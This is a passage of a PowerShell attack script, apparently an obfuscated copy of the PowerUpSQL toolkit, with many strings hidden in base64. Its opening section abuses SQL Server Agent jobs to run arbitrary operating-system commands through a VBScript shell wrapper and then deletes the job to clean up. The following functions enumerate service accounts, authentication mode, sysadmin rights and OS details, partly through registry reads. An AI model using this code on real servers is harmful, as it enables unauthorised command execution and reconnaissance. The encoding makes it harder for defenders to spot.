                If($SubSystem -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBCAFMAYwByAGkAcAB0AA==')))){
                    $VBScript_Command = @"
Function Main()
    dim shell
    set shell= CreateObject ("WScript.Shell")
    shell.run("$Command")
    set shell = nothing
END Function
"@
                    $Command = $VBScript_Command
                    $SubSystemFinal = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBjAHIAaQBwAHQAaQBuAGcA')))
                    $DatabaseSub = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QABkAGEAdABhAGIAYQBzAGUAXwBuAGEAbQBlAD0ATgAnAFYAQgBTAGMAcgBpAHAAdAAnACwA')))	
                }                
                $Command = $Command -replace "'","''"
                $JobQuery = "USE msdb; 
                EXECUTE dbo.sp_add_job 
                @job_name           = N'powerupsql_job'
                
                EXECUTE sp_add_jobstep 
                @job_name           = N'powerupsql_job',
                @step_name         = N'powerupsql_job_step', 
                @subsystem         = N'$SubSystemFinal', 
                @command           = N'$Command',
                $DatabaseSub 
                @flags=0,
                @retry_attempts    = 1, 
                @retry_interval    = 5     
                           

                EXECUTE dbo.sp_add_jobserver 
                @job_name           = N'powerupsql_job'
                
                EXECUTE dbo.sp_start_job N'powerupsql_job'"
                $CleanUpQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIABtAHMAZABiADsAIABFAFgARQBDAFUAVABFACAAcwBwAF8AZABlAGwAZQB0AGUAXwBqAG8AYgAgAEAAagBvAGIAXwBuAGEAbQBlACAAPQAgAE4AJwBwAG8AdwBlAHIAdQBwAHMAcQBsAF8AagBvAGIAJwA7AA==')))
                Write-Verbose -Message "$Instance : Running the command"
                Get-SQLQuery -Instance $Instance -Query $JobQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                $result = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAIABtAHMAZABiADsAIABFAFgARQBDAFUAVABFACAAcwBwAF8AaABlAGwAcABfAGoAbwBiACAAQABqAG8AYgBfAG4AYQBtAGUAIAA9ACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                if(!($result)) {
                    Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAuACAAUgBlAGMAaABlAGMAawAgAHkAbwB1AHIAIABjAG8AbQBtAGEAbgBkACAAYQBuAGQAIAB0AHIAeQAgAGEAZwBhAGkAbgAuAA==')))
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAuAA=='))))
                    return
                }
                Write-Verbose "$Instance : Starting sleep for $Sleep seconds"
                sleep $Sleep
                Write-Verbose "$Instance : Removing job from server"
                Get-SQLQuery -Instance $Instance -Query $CleanUpQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABKAG8AYgAgAHMAdQBjAGMAZQBzAGYAdQBsAGwAeQAgAHMAdABhAHIAdABlAGQAIABhAG4AZAAgAHcAYQBzACAAcgBlAG0AbwB2AGUAZAAuAA=='))))
            }
            else
            {
                Write-Verbose -Message "$Instance : You do not have privileges to add agent jobs (sp_add_job). Aborting..."
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAHIAaQB2AGkAbABpAGUAZwBlAHMAIAB0AG8AIABhAGQAZAAgAEEAZwBlAG4AdAAgAEoAbwBiAHMALgA='))))
                return
            }
            $Connection.Close()
            $Connection.Dispose()
            Write-Verbose -Message "$Instance : Command complete"
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
        }
        return $TblResults
    }
}
Function  Get-SQLServerInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
        ? -FilterScript {
            $_.SessionStatus -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AbgBpAG4AZwA=')))
        } |
        measure -Line |
        select -Property Lines -ExpandProperty Lines
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            $SysadminSetup = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABtAGEAYwBoAGkAbgBlACAAdAB5AHAAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFAAcgBvAGQAdQBjAHQATwBwAHQAaQBvAG4AcwAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAFAAcgBvAGQAdQBjAHQAVAB5AHAAZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAbwB1AHQAcAB1AHQADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAATwBTACAAdgBlAHIAcwBpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABQAHIAbwBkAHUAYwB0AE4AYQBtAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgAG8AdQB0AHAAdQB0AA==')))
            $SysadminQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAYQBzACAAWwBPAHMATQBhAGMAaABpAG4AZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABQAHIAbwBkAHUAYwB0AE4AYQBtAGUAIABhAHMAIABbAE8AUwBWAGUAcgBzAGkAbwBuAE4AYQBtAGUAXQAsAA==')))
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }
        $Query = "  -- Get SQL Server Information

            -- Get SQL Server Service Name and Path
            DECLARE @SQLServerInstance varchar(250)
            DECLARE @SQLServerServiceName varchar(250)
            if @@SERVICENAME = 'MSSQLSERVER'
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @SQLServerServiceName = 'MSSQLSERVER'
            END
            ELSE
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
            END

            -- Get SQL Server Service Account
            DECLARE @ServiceaccountName varchar(250)
            EXECUTE master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

            -- Get authentication mode
            DECLARE @AuthenticationMode INT
            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
            N'Software\Microsoft\MSSQLServer\MSSQLServer',
            N'LoginMode', @AuthenticationMode OUTPUT

            -- Get the forced encryption flag
            BEGIN TRY 
	            DECLARE @ForcedEncryption INT
	            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
	            N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
	            N'ForceEncryption', @ForcedEncryption OUTPUT
            END TRY
            BEGIN CATCH	            
            END CATCH

            -- Grab additional information as sysadmin
            $SysadminSetup

            -- Return server and version information
            SELECT  '$ComputerName' as [ComputerName],
            @@servername as [Instance],
            DEFAULT_DOMAIN() as [DomainName],
            SERVERPROPERTY('processid') as ServiceProcessID,
            @SQLServerServiceName as [ServiceName],
            @ServiceAccountName as [ServiceAccount],
            (SELECT CASE @AuthenticationMode
            WHEN 1 THEN 'Windows Authentication'
            WHEN 2 THEN 'Windows and SQL Server Authentication'
            ELSE 'Unknown'
            END) as [AuthenticationMode],
            @ForcedEncryption as ForcedEncryption,
            CASE  SERVERPROPERTY('IsClustered')
            WHEN 0
            THEN 'No'
            ELSE 'Yes'
            END as [Clustered],
            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
            serverproperty('Edition') as [SQLServerEdition],
            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
            $SysadminQuery
            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
            SYSTEM_USER as [Currentlogin],
            '$IsSysadmin' as [IsSysadmin],
        '$ActiveSessions' as [ActiveSessions]"
        $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
    }
    End
    {
        $TblServerInfo
    }
}
Function  Get-SQLServerInfoThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATgBhAG0AZQA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAE0AbwBkAGUA'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAHUAcwB0AGUAcgBlAGQA'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIAVgBlAHIAcwBpAG8AbgBOAHUAbQBiAGUAcgA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIATQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIARQBkAGkAdABpAG8AbgA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIAUwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlAA=='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBzAE0AYQBjAGgAaQBuAGUAVAB5AHAAZQA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4ATgBhAG0AZQA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBzAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIA'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABsAG8AZwBpAG4A'))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFMAeQBzAGEAZABtAGkAbgA='))))
        $null = $TblServerInfo.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBlAHMAcwBpAG8AbgBzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }
            $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
            ? -FilterScript {
                $_.SessionStatus -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AbgBpAG4AZwA=')))
            } |
            measure -Line |
            select -Property Lines -ExpandProperty Lines
            $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
            {
                $SysadminSetup = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAG0AYQBjAGgAaQBuAGUAIAB0AHkAcABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAIABTAFkAUwBOAEEATQBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAawBlAHkACQAJAAkAPQAgAE4AJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABQAHIAbwBkAHUAYwB0AE8AcAB0AGkAbwBuAHMAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAFAAcgBvAGQAdQBjAHQAVAB5AHAAZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIABvAHUAdABwAHUAdAANAAoADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAE8AUwAgAHYAZQByAHMAaQBvAG4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABQAHIAbwBkAHUAYwB0AE4AYQBtAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAbwBvAHQAawBlAHkACQAJAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUACQAJAD0AIABOACcAUAByAG8AZAB1AGMAdABOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABQAHIAbwBkAHUAYwB0AE4AYQBtAGUAIABvAHUAdABwAHUAdAA=')))
                $SysadminQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAYQBzACAAWwBPAHMATQBhAGMAaABpAG4AZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgAGEAcwAgAFsATwBTAFYAZQByAHMAaQBvAG4ATgBhAG0AZQBdACwA')))
            }
            else
            {
                $SysadminSetup = ''
                $SysadminQuery = ''
            }
            $Query = "  -- Get SQL Server Information

                -- Get SQL Server Service Name and Path
                DECLARE @SQLServerInstance varchar(250)
                DECLARE @SQLServerServiceName varchar(250)
                if @@SERVICENAME = 'MSSQLSERVER'
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                set @SQLServerServiceName = 'MSSQLSERVER'
                END
                ELSE
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
                END

                -- Get SQL Server Service Account
                DECLARE @ServiceaccountName varchar(250)
                EXECUTE master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
                N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

                -- Get authentication mode
                DECLARE @AuthenticationMode INT
                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
                N'Software\Microsoft\MSSQLServer\MSSQLServer',
                N'LoginMode', @AuthenticationMode OUTPUT

                -- Grab additional information as sysadmin
                $SysadminSetup

                -- Return server and version information
                SELECT  '$ComputerName' as [ComputerName],
                @@servername as [Instance],
                DEFAULT_DOMAIN() as [DomainName],
                @SQLServerServiceName as [ServiceName],
                @ServiceAccountName as [ServiceAccount],
                (SELECT CASE @AuthenticationMode
                WHEN 1 THEN 'Windows Authentication'
                WHEN 2 THEN 'Windows and SQL Server Authentication'
                ELSE 'Unknown'
                END) as [AuthenticationMode],
                CASE  SERVERPROPERTY('IsClustered')
                WHEN 0
                THEN 'No'
                ELSE 'Yes'
                END as [Clustered],
                SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
                SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
                serverproperty('Edition') as [SQLServerEdition],
                SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
                SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
                $SysadminQuery
                RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
                SYSTEM_USER as [Currentlogin],
                '$IsSysadmin' as [IsSysadmin],
            '$ActiveSessions' as [ActiveSessions]"
            $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblServerInfoTemp |
            % -Process {
                $null = $TblServerInfo.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DomainName,
                    $_.ServiceName,
                    $_.ServiceAccount,
                    $_.AuthenticationMode,
                    $_.Clustered,
                    $_.SQLServerVersionNumber,
                    $_.SQLServerMajorVersion,
                    $_.SQLServerEdition,
                    $_.SQLServerServicePack,
                    $_.OSArchitecture,
                    $_.OsMachineType,
                    $_.OSVersionName,
                    $_.OsVersionNumber,
                    $_.Currentlogin,
                    $_.IsSysadmin,
                    $_.ActiveSessions
                )
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblServerInfo
    }
}
Function  Get-SQLDatabase
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAEkAZAA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE8AdwBuAGUAcgA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAEkAcwBTAHkAcwBhAGQAbQBpAG4A'))))
